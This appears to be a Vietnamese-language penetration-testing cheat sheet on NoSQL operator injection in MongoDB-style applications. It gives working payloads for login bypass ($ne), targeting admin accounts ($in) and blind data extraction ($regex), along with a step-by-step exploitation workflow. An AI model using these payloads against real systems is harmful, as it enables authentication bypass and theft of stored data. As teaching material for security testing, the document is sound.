# Operator Injection Trong NoSQL

## Tong quan

`Operator injection` xay ra khi input cua attacker duoc parse thanh query operator thay vi literal value.

Vi du:

```js
db.products.find({ price: userInput });
```

Neu `userInput` la:

```json
{"$gt":0}
```

thi query bi doi tu match chinh xac sang match range.

Day la dang NoSQLi pho bien nhat trong he MongoDB-style.

## Vi sao xay ra

Thuong do mot hoac nhieu nguyen nhan:

- parser bracket notation tao nested object
- scalar field chap nhan object
- endpoint forward filter truc tiep
- merge object khong validate key/type

## Operator thuong bi abuse

| Operator | Muc dich tan cong |
|---------|-------------------|
| `$ne` | broad match |
| `$gt` / `$lt` | mo rong dieu kien so sanh |
| `$in` / `$nin` | target/bo qua account cu the |
| `$exists` | probe schema |
| `$regex` | blind extraction |
| `$where` | mo rong sang JS injection |

## Dinh dang payload

### JSON body

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

### Form-urlencoded

```text
username[$ne]=invalid&password[$ne]=invalid
```

### Query string

```text
?username[$regex]=^adm&password[$ne]=x
```

Neu GET khong duoc, thu doi sang POST + JSON.

## Detection pattern

### Broad match test

```json
{"username":{"$ne":"invalid"}}
```

Neu login/search doi behavior ro rang, operator path da lo.

### Existence test

```json
{"username":{"$exists":true}}
```

Dung de do field presence.

### Regex test

```json
{"password":{"$regex":"^.*"}}
```

Neu response khac voi password sai thong thuong, co the dung lam oracle.

### Targeted username

```json
{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}
```

Dung khi broad bypass khong vao dung account.

## Query logic pattern can nho

| Pattern | Vi du | Tac dung |
|--------|-------|----------|
| broad non-equal | `{"password":{"$ne":"x"}}` | match gan nhu tat ca |
| range widening | `{"price":{"$gt":0}}` | lo data ngoai scope |
| targeted list | `{"username":{"$in":[...]}}` | chi nham account gia tri cao |
| regex oracle | `{"password":{"$regex":"^ad"}}` | rut data tung ky tu |

## So sanh nhanh voi syntax injection

| Cau hoi | Operator injection | Syntax injection |
|---------|--------------------|------------------|
| Co can break quote? | Thuong khong | Thuong co |
| Payload object-shaped? | Thuong co | Khong bat buoc |
| Phu thuoc parser coercion? | Rat thuong gap | Co the co |

## Gioi han

Operator injection co the that bai neu:

- app ep type scalar nghiem ngat
- key bat dau bang `$` bi strip/reject de quy
- auth check tach khoi query selector
- query builder cho phep tap operator rat han che

## Quy trinh khai thac

1. Test object payload tren field mong doi scalar.
2. Xac dinh operator nao duoc chap nhan.
3. Tim oracle (redirect, content diff, status, timing).
4. Chon muc tieu: bypass auth hay blind extract.
5. Chuyen tu broad payload sang payload co target.
